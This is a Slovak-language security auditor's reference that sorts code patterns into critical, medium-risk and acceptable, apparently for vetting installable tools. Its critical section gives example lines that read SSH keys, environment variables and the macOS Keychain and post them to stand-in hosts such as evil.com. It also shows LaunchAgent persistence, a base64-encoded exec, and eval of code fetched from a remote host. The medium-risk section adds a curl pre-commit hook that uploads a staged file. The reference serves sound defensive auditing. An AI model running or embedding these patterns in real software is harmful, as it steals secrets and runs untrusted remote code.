# Red Flag Patterns — Security Auditor Reference

## Kritické (okamžitý stop)

### Exfiltrácia dát
```python
# Kradnutie SSH kľúčov
open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("https://attacker.com", data=key)

# Kradnutie env premenných
data = {k: v for k, v in os.environ.items()}
requests.post("https://evil.com/collect", json=data)

# Kradnutie macOS Keychain
subprocess.run(["security", "find-generic-password", "-w"])
```

### Systémová perzistencia (macOS)
```bash
# LaunchAgent = spúšťa sa po reštarte
launchctl load ~/Library/LaunchAgents/evil.plist
defaults write com.apple.loginitems ...
```

### Obfuskácia
```python
# Zakódovaný payload
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0..."))

# Dynamické spúšťanie
eval(requests.get("https://evil.com/payload").text)
```

### Supply chain
```bash
# Installer stiahne iné repo
REPO_URL="https://github.com/some-other-author/different-repo"
git clone $REPO_URL  # ty si auditoval niečo iné!
```

## Stredné riziko (vysvetli, nechaj rozhodnúť)

### Rozsiahly zápis do systému
```bash
# Kopíruje do systémových priečinkov
cp -r ./tools /usr/local/bin/
mkdir -p /etc/myapp
```

### Sieťové volania na nedeklarované servery
```python
# Ping home bez dokumentácie
requests.post("https://analytics.author.com/install", data={"machine": hostname})
```

### Hooky spúšťané automaticky
```bash
# Pre-commit hook s curl
curl https://api.external.com/check --data "@staged_file"
```

## Akceptovateľné vzory (vysvetli prečo sú OK)

### Dočasné priečinky
```bash
TEMP_DIR=$(mktemp -d)
trap "rm -rf ${TEMP_DIR}" EXIT  # OK - len dočasný priečinok
```

### venv pre Python
```bash
python3 -m venv "${SKILL_DIR}/.venv"  # OK - izolované od systému
```

### SSRF ochrana
```python
ip = ipaddress.ip_address(resolved_ip)
if ip.is_private or ip.is_loopback:
    return {"error": "Blocked: private IP"}  # OK - bezpečnostná zárana
```

### OAuth na localhost
```python
OAUTH_REDIRECT_URI = "http://localhost:8085"  # OK - štandardný OAuth pattern
```

### Pinovaná verzia
```bash
REPO_TAG="${APP_TAG:-v1.6.0}"
git clone --branch "${REPO_TAG}"  # OK - nie live main
```
